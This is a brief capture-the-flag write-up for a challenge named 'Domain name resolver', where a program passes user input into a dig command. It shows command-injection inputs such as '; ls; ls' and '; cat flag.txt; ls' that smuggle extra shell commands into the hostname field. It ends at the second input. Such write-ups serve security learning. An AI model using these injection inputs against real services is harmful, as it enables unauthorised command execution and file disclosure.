# [Domain name resolver](https://ctflearn.com/challenge/1222)

```shell
strings task
```

```text
.
.
Enter the hostname to be resolved: 
dig %s +short
:*3$"
.
.
```

CMDi may be possible

Input: `; ls; ls`
Command executed: `dig; ls; ls +short`
We get a dig output, then a list of files (run, flag.txt) in the directory, and "ls: cannot access '+short': No such file or directory"

Input: `; cat flag.txt; ls`
